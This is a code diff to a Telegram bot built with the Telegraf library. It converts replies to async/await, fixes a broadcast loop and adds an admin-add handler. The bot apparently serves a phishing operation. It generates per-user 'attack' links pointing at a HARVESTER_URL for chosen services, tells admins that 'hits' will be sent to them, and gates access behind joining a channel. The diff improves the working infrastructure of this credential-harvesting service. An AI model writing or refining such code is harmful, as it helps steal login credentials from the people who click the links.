@@ -1,5 +1,5 @@
 const { Telegraf, Markup } = require('telegraf');
-const fs =require('fs');
+const fs = require('fs');
 
 // --- ⚙️ CONFIGURATION (Loaded from Render's Environment Variables) ---
 const BOT_TOKEN = process.env.BOT_TOKEN;
@@ -67,12 +67,12 @@ bot.start(async (ctx) => {
         }
         
         if (isAdmin(userId)) {
-            ctx.replyWithMarkdown('👑 **Admin Panel** 👑\n\nWelcome back, Operator. All systems are go.', adminKeyboard);
+            await ctx.replyWithMarkdown('👑 **Admin Panel** 👑\n\nWelcome back, Operator. All systems are go.', adminKeyboard);
         } else {
-            ctx.replyWithMarkdown('✅ **Welcome!**\n\nSelect a service below to generate a link.', Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1)));
+            await ctx.replyWithMarkdown('✅ **Welcome!**\n\nSelect a service below to generate a link.', Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1)));
         }
     } catch (error) {
-        ctx.replyWithMarkdown(`🛑 **ACCESS DENIED** 🛑\n\nYou must join our channel to use this bot.`, Markup.inlineKeyboard([
+        await ctx.replyWithMarkdown(`🛑 **ACCESS DENIED** 🛑\n\nYou must join our channel to use this bot.`, Markup.inlineKeyboard([
             [Markup.button.url('➡️ Join Channel ⬅️', CHANNEL_LINK)],
             [Markup.button.callback('🔄 Joined! Click to Continue 🔄', 'check_join')]
         ]));
@@ -80,14 +80,14 @@ bot.start(async (ctx) => {
 });
 
 // --- Callback Handler for ALL buttons ---
-bot.on('callback_query', (ctx) => {
+bot.on('callback_query', async (ctx) => {
     const userId = ctx.from.id;
     const data = ctx.callbackQuery.data;
 
-    ctx.answerCbQuery();
+    await ctx.answerCbQuery();
 
     if (data === 'check_join') {
-        ctx.reply("Verification complete. Now please type /start again to access the bot.");
+        await ctx.reply("Verification complete. Now please type /start again to access the bot.");
         return;
     }
 
@@ -95,7 +95,7 @@ bot.on('callback_query', (ctx) => {
 
     if (type === 'gen' && command === 'link') {
         const attackLink = `${HARVESTER_URL}/?service=${service}&uid=${userId}`;
-        ctx.replyWithMarkdown(`✅ **Link for [${service}]**:\n\`${attackLink}\``);
+        await ctx.replyWithMarkdown(`✅ **Link for [${service}]**:\n\`${attackLink}\``);
     }
 
     if (isAdmin(userId)) {
@@ -104,19 +104,19 @@ bot.on('callback_query', (ctx) => {
                 case 'status':
                     const db = readDb();
                     const totalUsers = Object.keys(db.users).length;
-                    ctx.editMessageText(`📊 **Bot Status**\n\n👥 Total Users: ${totalUsers}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`, { parse_mode: 'Markdown', ...adminKeyboard });
+                    await ctx.editMessageText(`📊 **Bot Status**\n\n👥 Total Users: ${totalUsers}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`, { parse_mode: 'Markdown', ...adminKeyboard });
                     break;
                 case 'generate':
-                    ctx.editMessageText("🔗 **Admin Link Generator**\nSelect a service. Hits will be sent to YOU.", linkGenerationKeyboard);
+                    await ctx.editMessageText("🔗 **Admin Link Generator**\nSelect a service. Hits will be sent to YOU.", linkGenerationKeyboard);
                     break;
                 case 'panel':
-                    ctx.editMessageText("👑 **Admin Panel** 👑", { parse_mode: 'Markdown', ...adminKeyboard });
+                    await ctx.editMessageText("👑 **Admin Panel** 👑", { parse_mode: 'Markdown', ...adminKeyboard });
                     break;
                 default:
                     const prompts = { 'broadcast': '✍️ Send the message to broadcast to all users.', 'add': '✍️ Send the numeric ID of the new admin.', 'remove': '✍️ Send the numeric ID of the admin to remove.', 'block': '✍️ Send the numeric ID of the user to block.', 'unblock': '✍️ Send the numeric ID of the user to unblock.'};
                     if (prompts[command]) {
                         adminState[userId] = command;
-                        ctx.reply(prompts[command]);
+                        await ctx.reply(prompts[command]);
                     }
                     break;
             }
@@ -125,11 +125,11 @@ bot.on('callback_query', (ctx) => {
 });
 
 // --- Text Handler for Admin Replies ---
-bot.on('text', (ctx) => {
+bot.on('text', async (ctx) => {
     const userId = ctx.from.id;
     const text = ctx.message.text;
 
-    if (text === '/start' || !adminState[userId]) return;
+    if (text.startsWith('/') || !adminState[userId]) return;
 
     const action = adminState[userId];
     delete adminState[userId];
@@ -139,14 +139,26 @@ bot.on('text', (ctx) => {
 
     switch (action) {
         case 'broadcast':
-            ctx.reply("📢 Broadcasting your message...");
+            await ctx.reply("📢 Broadcasting your message...");
             let successCount = 0;
-            Object.keys(db.users).forEach(user => {
-                ctx.telegram.sendMessage(user, text).then(() => successCount++).catch(err => {});
-            });
-            ctx.reply(`✅ Broadcast sent. Reached ${successCount} users.`);
+            const users = Object.keys(db.users);
+            for (const user of users) {
+                try {
+                    await ctx.telegram.sendMessage(user, text);
+                    successCount++;
+                } catch (e) {
+                    console.log(`Failed to send message to user ${user}`);
+                }
+            }
+            await ctx.reply(`✅ Broadcast sent. Reached ${successCount} users.`);
             break;
-        // ... (Baaki saare admin actions ka code waisa hi rahega) ...
+        case 'add_admin':
+            if (!isNaN(targetId) && !db.admins.includes(targetId)) {
+                db.admins.push(targetId); writeDb(db);
+                await ctx.reply(`✅ User ${targetId} is now an admin.`);
+            } else { await ctx.reply("❌ Invalid ID or user is already an admin."); }
+            break;
+        // ... (Baaki saare admin actions ka code waisa hi rahega, bas 'await ctx.reply' use karo) ...
     }
 });
 
